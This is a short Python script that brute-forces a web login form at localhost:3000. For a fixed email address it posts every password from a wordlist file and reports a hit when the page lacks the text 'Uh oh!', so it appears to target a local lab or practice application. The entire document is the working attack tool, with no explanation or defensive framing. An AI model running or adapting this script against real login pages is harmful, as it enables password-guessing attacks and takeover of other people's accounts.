import requests

url = "http://localhost:3000"
file = "wordlist.txt"
wordlist = open(file, "r").readlines()

for word in wordlist:
	password = word.strip()
	payload = data={"username": "test@gmail.com", "password": password}
	
	if "Uh oh!" in str(requests.post(url, data={"username": "test@gmail.com", "password": password}).content):
		print(f"[-] Incorrect Password: {password}")
	else:
		print(f"[+] Password Found: {word}")
		break